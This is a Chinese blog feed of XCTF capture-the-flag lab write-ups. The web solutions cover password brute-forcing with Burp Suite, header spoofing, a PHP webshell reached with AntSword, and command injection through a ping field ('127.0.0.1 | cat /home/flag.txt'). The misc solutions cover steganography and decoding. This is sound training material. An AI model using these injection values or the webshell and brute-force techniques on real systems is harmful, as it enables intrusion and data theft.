class="headerlink" title="cookie"></a>cookie</h2><p>解法一：<br>（1）在Firefox浏览器按下F12键打开开发者工具，刷新后，在“存储”一栏，可看到名为look-here的cookie的值为cookie.php<br><img src="https://img-blog.csdnimg.cn/20201030162605217.png#pic_center" alt="在这里插入图片描述"><br>（2）构造链接访问<a href="http://220.249.52.133:38910/cookie.php%EF%BC%8C%E6%8F%90%E7%A4%BA%E6%9F%A5%E7%9C%8Bhttp%E5%93%8D%E5%BA%94%E5%8C%85%EF%BC%8C%E5%9C%A8%E2%80%9C%E7%BD%91%E7%BB%9C%E2%80%9D%E4%B8%80%E6%A0%8F%EF%BC%8C%E5%8F%AF%E7%9C%8B%E5%88%B0%E8%AE%BF%E9%97%AEcookie.php%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%8C%E5%9C%A8%E6%B6%88%E6%81%AF%E5%A4%B4%E5%86%85%E5%8F%AF%E5%8F%91%E7%8E%B0flag">http://220.249.52.133:38910/cookie.php，提示查看http响应包，在“网络”一栏，可看到访问cookie.php的数据包，在消息头内可发现flag</a><br><img src="https://img-blog.csdnimg.cn/20201030162715758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法二：<br>（1）使用burpsuite工具扫描URL，然后查看response（响应），可看到名为look-here的cookie的值为cookie.php<br><img src="https://img-blog.csdnimg.cn/20201030162823230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）继续扫描构造的链接<a href="http://220.249.52.133:38910/cookie.php%E6%9F%A5%E7%9C%8Bresponse%E8%8E%B7%E5%8F%96flag">http://220.249.52.133:38910/cookie.php查看response获取flag</a></p><p><img src="https://img-blog.csdnimg.cn/20201030162939369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>（1）使用Firefox浏览器按F12键打开开发者工具，在查看器窗口审查元素，发现存在disabled=””字段，在按钮中使用了该属性，右键编辑HTML，将该字段删除。按钮可按，即可得到flag。<br><img src="https://img-blog.csdnimg.cn/20201030163135720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030163144714.png#pic_center" alt="在这里插入图片描述"><br>（2）使用Firefox的hackbar，用post方式传递auth=flag，同样可以得到flag。</p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>（1）题目属于弱口令爆破，随便输入一个用户名和密码，提示要用admin用户登录，跳转到了check.php，在URL前加view-source:查看源代码，提示要用字典。<br><img src="https://img-blog.csdnimg.cn/20201030163454217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030163504331.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030163514763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）在Firefox浏览器中“选项”–&gt;”网络设置”–&gt;“手动代理配置”开启foxproxy代理服务器，打开Burpsuite工具，点击代理—拦截请求，输入123密码再登录。<br><img src="https://img-blog.csdnimg.cn/20201030163610494.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030163619937.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030163628572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）设置爆破点：将123作为攻击对象，具体操作：测试器–&gt;位置–&gt;选中“123”–&gt;添加<br><img src="https://img-blog.csdnimg.cn/20201030163707884.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030163717546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）加载字典：点击有效载荷–载入–常用密码.txt。</p><p>字典:<a href="https://github.com/rootphantomer/Blasting_dictionary">https://github.com/rootphantomer/Blasting_dictionary</a><br><img src="https://img-blog.csdnimg.cn/20201030163748612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）开始攻击，查看响应包列表，发现密码为123456时，响应包的长度和别的不一样<br><img src="https://img-blog.csdnimg.cn/20201030163933455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（7）点进去查看响应包，发现flag<br><img src="https://img-blog.csdnimg.cn/20201030164002522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>（1）打开页面，进行代码审计，发现需要输入a，b变量，同时满足a==0 且a为真，b不是数字且b&gt;1234才回返回flag，用get方法输入变量，在URL后加“/?”即可开始赋值，传输多个参数则以”&amp;”间隔。<br><img src="https://img-blog.csdnimg.cn/20201030164501603.png#pic_center" alt="在这里插入图片描述"><br>（2）输入a=0无法得到flag1，因为不满足第二个a为真的条件，所以可以把参数a构造为’0’或abc这种转换后为0，但本身也为真的形式，即str类型。<br><img src="https://img-blog.csdnimg.cn/20201030164537818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）数字和字符混合的字符串转换为整数后只保留数字，所以b可以构造为12345a，类型转换后为12345，大于1234，得到flag。<br><img src="https://img-blog.csdnimg.cn/20201030164614884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p>（1）打开网页后，发现IP是123.123.123.123，使用Firefox浏览器，手动配置代理服务器<br>（2）打开Brup工具抓包，点击代理（Proxy）—拦截请求，刷新原来页面<br><img src="https://img-blog.csdnimg.cn/20201030165650136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）右键选择发送到repeater。在repeater里查看目标地址内容，在Host下方添加：<br>X-Forwarded-For：123.123.123.123（这一步是伪造XFF，点击放包（Forward），收到提示）原来的页面变成了<a href="https://www.google.com/">https://www.google.com</a><br><img src="https://img-blog.csdnimg.cn/2020103016573910.png#pic_center" alt="在这里插入图片描述"><br>（4）在Repeater（重发器），Host下方添加：<br>X-Forwarded-For:123.123.123.123Referer:<a href="https://www.google.com/">https://www.google.com</a>  (这一步是伪造Referer）点击发送，在响应中看到flag<br><img src="https://img-blog.csdnimg.cn/2020103016581839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030165825662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>#XFF漏洞攻击原理及防御方案：<a href="https://www.freebuf.com/company-information/220414.html">https://www.freebuf.com/company-information/220414.html</a></p><p>xff和referer:<br>#X-Forwarded-For：简称xff头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP代理或者负载均衡服务器时才会添加该项。xff是http的拓展头部，作用是Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff作用在于记录用户的真实IP，以及代理服务器的IP。格式为：<br>X-Forwarded-For：本机IP，代理1IP，代理2IP。</p><p>#HTTP Referer是header的一部分，当浏览器向Web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基于此可以获得一些有用的信息用于处理。Referer是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用Referer确认访问来源，如果Referer内容不符合要求，服务器可以拦截或者重定向请求。</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>（1）一句话木马，直接提示给了php一句话，使用菜刀类工具连接（Cknife或中国蚁剑），口令就是shell<br><img src="https://img-blog.csdnimg.cn/20201030165954864.png#pic_center" alt="在这里插入图片描述"><br>（2）这里使用中国蚁剑。右键–&gt;Add,输入URL和口令，选择类型，点击”Add“即可<br><img src="https://img-blog.csdnimg.cn/20201030170109978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）右键–&gt;“FileManager”文件管理，即可发现flag.txt文件，打开获取flag<br><img src="https://img-blog.csdnimg.cn/20201030170159963.png#pic_center" alt="在这里插入图片描述"></p><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p><img src="https://img-blog.csdnimg.cn/20201030175139262.png#pic_center" alt="在这里插入图片描述"><br>（1）尝试输入127.0.0.1，发现可以访问成功<br><img src="https://img-blog.csdnimg.cn/20201030175201626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）输入127.0.0.1 | ls（用&amp;&amp;也可以），看是否能够访问当前目录<br><img src="https://img-blog.csdnimg.cn/20201030175232194.png#pic_center" alt="在这里插入图片描述"><br>（3）访问成功，再试试寻找 .txt文件（或者直接寻找flag.txt文件也可），输入</p><pre><code>127.0.0.1 | find / -name &quot;*.txt&quot;           //寻找.txt文件127.0.0.1 | find / -name &quot;flag.txt&quot;        //寻找flag.txt文件</code></pre><p><img src="https://img-blog.csdnimg.cn/20201030175527632.png#pic_center" alt="在这里插入图片描述"><br>（4）访问成功后都可发现flag.txt文件，用127.0.0.1 | cat /home/flag.txt 即可查看到flag<br><img src="https://img-blog.csdnimg.cn/20201030175542635.png#pic_center" alt="在这里插入图片描述"><br>#命令拼接：管道符“|”，其功能为将前一个命令的结果传递给后一个命令作为输入<br>&amp;&amp;：前一条命令执行成功时，才执行后一条命令</p><pre><code>command1 | command2                                //只输出2的结果command1 &amp;&amp; command2                             // 成功才执行2</code></pre><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p><img src="https://img-blog.csdnimg.cn/20201030175827150.png#pic_center" alt="在这里插入图片描述"><br>（1）打开页面需要输入密码，查看网页源代码，可以发现js代码<br><img src="https://img-blog.csdnimg.cn/20201030175901100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）进行代码审计，发现不论输入什么都会跳到假密码，真密码位于 fromCharCode<br>（3）发现该字符串中用到C语言的转义字符\x，每个\x后面的两位是一个16进制数，直接用C语言printf输出即可得到对应的ASCII码值。<br><img src="https://img-blog.csdnimg.cn/20201030180003309.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030180010836.png#pic_center" alt="在这里插入图片描述"><br>（4）将得到的数字转为ASCII码值即可得到flag<br><img src="https://img-blog.csdnimg.cn/20201030180058366.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030180111939.png#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Web练习区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Misc_002</title>
      <link href="2020/11/15/XCTF/XCTF_Misc-002/"/>
      <url>2020/11/15/XCTF/XCTF_Misc-002/</url>
      
        <content type="html"><![CDATA[<h2 id="Janos-the-Ripper"><a href="#Janos-the-Ripper" class="headerlink" title="János-the-Ripper"></a>János-the-Ripper</h2><p>（1）附件是一个压缩包，解压后得到一个没有后缀名的文件，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201031111055252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）是一个压缩包，改后缀名为zip，解压，但需要密码<br><img src="https://img-blog.csdnimg.cn/20201031113641184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）直接暴力破解，得到密码fish<br><img src="https://img-blog.csdnimg.cn/20201031113742969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）得到flag<br><img src="https://img-blog.csdnimg.cn/20201031113816887.png#pic_center" alt="在这里插入图片描述"></p><h2 id="Test-flag-please-ignore"><a href="#Test-flag-please-ignore" class="headerlink" title="Test-flag-please-ignore"></a>Test-flag-please-ignore</h2><p>（1）下载附件，是一个压缩包，解压后用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201101110811501.png#pic_center" alt="在这里插入图片描述">（2）一串十六进制数，转为字符串<br><img src="https://img-blog.csdnimg.cn/20201101110859979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="hit-the-core"><a href="#hit-the-core" class="headerlink" title="hit-the-core"></a>hit-the-core</h2><p>（1）下载附件，得到一个core文件，放到kali下，使用命令strings查看字符串。<br><img src="https://img-blog.csdnimg.cn/20201102174632149.png#pic_center" alt="在这里插入图片描述"></p><p>（2）发现一串特殊的字符，格式像flag，看到前面的大写字母为ALXCTF，相邻的字母之间都隔了4个字符，按照这个规律，写个简单的程序（C语言），提取出flag。</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;strings.h&gt;int main()&#123;    char a[200];    gets(a);    int i=3;    while(a[i] != 0)&#123;        printf(&quot;%c&quot;,a[i]);        i+=5;    &#125;    system(&quot;pause&quot;);    return 0;&#125;</code></pre><p><img src="https://img-blog.csdnimg.cn/20201102175004523.png#pic_center" alt="在这里插入图片描述"></p><h2 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h2><p>（1）得到一个附件，是一个捉猫猫游戏。鼓捣了好久，没有发现任何flag信息，最后看了大家的writeup，都是玩通关得出来的。没法，玩呗，玩了好久，终于困住猫了，拿到了flag。<br><img src="https://img-blog.csdnimg.cn/20201103203219434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Banmabanma"><a href="#Banmabanma" class="headerlink" title="Banmabanma"></a>Banmabanma</h2><p>（1）下载附件，一张斑马的图片，看了看，典型的条形码，直接在线扫码<a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a><br><img src="https://img-blog.csdnimg.cn/2020110320424561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）得到flag。<br><img src="https://img-blog.csdnimg.cn/20201103204313481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>（1）下载附件，用wireshark打开，选择一个包，追踪tcp流，发现flag。注意格式，直接提交 FLAG:385b87afc8671dee07550290d16a8071 即可。<br><img src="https://img-blog.csdnimg.cn/20201103205333423.png#pic_center" alt="在这里插入图片描述"></p><h2 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h2><p>（1）下载附件，得到一张图片，用stegsolve工具打开，图片太大直接用键盘上的左右键切换视图，在左一视图发现一个二维码。<br><img src="https://img-blog.csdnimg.cn/20201103220936994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）用二维码扫描器扫描，得到一串十六进制数。<br><img src="https://img-blog.csdnimg.cn/20201103221021711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（3）保存到一个文本文档，命名为1.txt，用010 editor导入十六进制，数字的开头为03 F3 ,可知是pyc文件，保存为1.pyc<br><img src="https://img-blog.csdnimg.cn/20201103221315213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（4）用在线工具反编译，<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a><br><img src="https://img-blog.csdnimg.cn/2020110322144843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（5）复制后再Python.exe下执行，由于反编译后得到的是Python2的代码，这里我用的是Python3，要做点修改，最后一行改为print (flag)<br><img src="https://img-blog.csdnimg.cn/20201103222149719.png#pic_center" alt="在这里插入图片描述"><br>（6）前面的“…”是在循环中，按两下回车退出循环，然后再加一个flag(),调用函数，得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Misc进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Misc_001</title>
      <link href="2020/11/15/XCTF/XCTF_Misc-001/"/>
      <url>2020/11/15/XCTF/XCTF_Misc-001/</url>
      
        <content type="html"><![CDATA[<h2 id="base64÷4"><a href="#base64÷4" class="headerlink" title="base64÷4"></a>base64÷4</h2><p><img src="https://img-blog.csdnimg.cn/20201029233527346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029233823554.png#pic_center" alt="在这里插入图片描述"><br>（1）根据题目提示，直接用base16解密得到flag</p><p><img src="https://img-blog.csdnimg.cn/20201029233921359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="reverseMe"><a href="#reverseMe" class="headerlink" title="reverseMe"></a>reverseMe</h2><p>（1）打开附件，发现是一张图片<br><img src="https://img-blog.csdnimg.cn/20201029234035117.png#pic_center" alt="在这里插入图片描述"><br>（2）用画图工具打开该图片，使用水平翻转，即可查看到flag<br><img src="https://img-blog.csdnimg.cn/20201029234114796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029234125317.png#pic_center" alt="在这里插入图片描述"></p><h2 id="something-in-image"><a href="#something-in-image" class="headerlink" title="something_in_image"></a>something_in_image</h2><p>解法一：<br>（1）使用记事本或010 editor工具打开附件，Ctrl+F搜索flag<br><img src="https://img-blog.csdnimg.cn/20201029234240873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029234254152.png#pic_center" alt="在这里插入图片描述"><br>解法二：<br>根据题目包含image，使用kali，命令：strings badimages | grep Flag    （注，根据记事本中常出现的“Flag”，而不是“flag”进行搜索）<br><img src="https://img-blog.csdnimg.cn/2020102923435872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="wireshark-1"><a href="#wireshark-1" class="headerlink" title="wireshark-1"></a>wireshark-1</h2><p>（1）用wireshark打开附件，输入表达式http contains flag查找flag信息，根据题目，看到登录应该查找HTTP post请求，追踪筛选出的报文追踪tcp流，即可看到flag<br><img src="https://img-blog.csdnimg.cn/2020102923460010.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029234609210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="pure-color"><a href="#pure-color" class="headerlink" title="pure_color"></a>pure_color</h2><p>（1）附件是一张全白的png图片<br><img src="https://img-blog.csdnimg.cn/20201029234704614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）用notepad++打开没有发现flag信息<br>（3）用stegsolve打开，打开 File Format Analysis 没有flag的线索<br><img src="https://img-blog.csdnimg.cn/2020102923475148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4)最后在最底下的’&lt;’按钮发现了flag<br><img src="https://img-blog.csdnimg.cn/202010292348317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Aesop-secret"><a href="#Aesop-secret" class="headerlink" title="Aesop_secret"></a>Aesop_secret</h2><p>（1）下载附件得到一张gif的动图，通过stegsolve工具分解得到9张图片<br><img src="https://img-blog.csdnimg.cn/20201029235041213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）用画图工具分别将这九张图通过旋转、裁剪一系列操作，得到9张裁剪过的图，再将这9张裁剪过的图片拼在一起（这里耗费了较多时间），得到如下图<br><img src="https://img-blog.csdnimg.cn/20201029235123359.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029235133815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）图片显示为ISCC，显然不是flag，再用notepad++打开原来的gif动图，发现一串密文<br><img src="https://img-blog.csdnimg.cn/20201029235235364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）用base64解码，无果，根据题目和上面图片的ISCC，联想到AES加密，ISCC则为密钥<br><img src="https://img-blog.csdnimg.cn/202010292352570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）解码后仍然是一串密文，再次解密，得到flag<br><img src="https://img-blog.csdnimg.cn/20201029235319285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="a-good-idea"><a href="#a-good-idea" class="headerlink" title="a_good_idea"></a>a_good_idea</h2><p>（1）打开附件，是一张.jpg格式的图片，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201029235355127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020102923541217.png#pic_center" alt="在这里插入图片描述"><br>（2）确实以FF D8开头，寻找图片结尾FF D9，发现后面还有一个压缩文件<br><img src="https://img-blog.csdnimg.cn/20201029235436753.png#pic_center" alt="在这里插入图片描述"><br>（3）将原图片后缀名改为.zip，解压后得到一个文件夹，里面是两张相同的图片和一个hint提示文本<br><img src="https://img-blog.csdnimg.cn/20201029235502674.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029235519348.png#pic_center" 